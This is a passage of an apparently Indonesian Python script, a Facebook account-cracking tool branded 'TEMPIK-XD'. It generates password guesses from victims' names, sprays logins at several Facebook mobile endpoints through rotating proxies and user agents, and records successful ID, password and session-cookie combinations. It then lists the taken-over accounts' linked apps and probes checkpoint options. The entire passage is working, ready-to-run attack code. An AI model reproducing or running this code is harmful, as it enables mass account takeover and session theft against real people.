	pwplus=input('╰─➣ 𝐓𝐚𝐦𝐛𝐚𝐡𝐤𝐚𝐧 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐌𝐚𝐧𝐮𝐚𝐥 ( 𝐘/𝐭 ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('╰─➣ Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} 🅷🅰🆁🆄🆂 🆂🅰🅱🅰🆁 {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'╰─➣ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'╰─➣ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'╰─➣ Mainkan Mode Pesawat Setiap {m}500{x} ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','celek','anjing','ngiclik']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] 𝐂𝐫𝐚𝐜𝐤 𝐒𝐞𝐥𝐞𝐬𝐚𝐢 𝐍𝐠𝐚𝐛, 𝐉𝐚𝐧𝐠𝐚𝐧 𝐋𝐮𝐩𝐚 𝐁𝐞𝐫𝐬𝐲𝐮𝐤𝐮𝐫[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('╰─➣ Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Terima Kasih{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r🤑 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}╰─➣{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}╰─➣ {H}{idf}|{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}╰─➣ {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio .cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
				os.popen('play-audio .ok.mp3')
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#			if "checkpoint" in po.cookies.get_dict().keys():
#				print(f'\r{K}>> {idf}|{pw}{N}')     
#				os.popen('play-audio .cp.mp3')
#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#				akun.append(idf+'|'+pw)
#				cp+=1
#				break
#			elif "c_user" in ses.cookies.get_dict().keys():
#				ok+=1
#				coki=po.cookies.get_dict()
#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
#				os.popen('play-audio .ok.mp3')
#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
#				cek_apk(session,coki)
#				break
#				
#			else:
#				continue
#		except requests.exceptions.ConnectionError:
#			time.sleep(31)
#	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='TEMPIK-XD CP'))
					open('/sdcard/download/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/download/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='TEMPIK-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/download/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐀𝐏𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐎𝐍𝐒 :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]TEMPIK-XD OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='TEMPIK-XD CP'))
					open('/sdcard/download/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/download/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/download/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] 𝐋𝐈𝐒𝐓 𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐏𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐎𝐍𝐒 :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] 𝐋𝐈𝐒𝐓 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐀𝐏𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐎𝐍𝐒 :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]TEMPIK-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
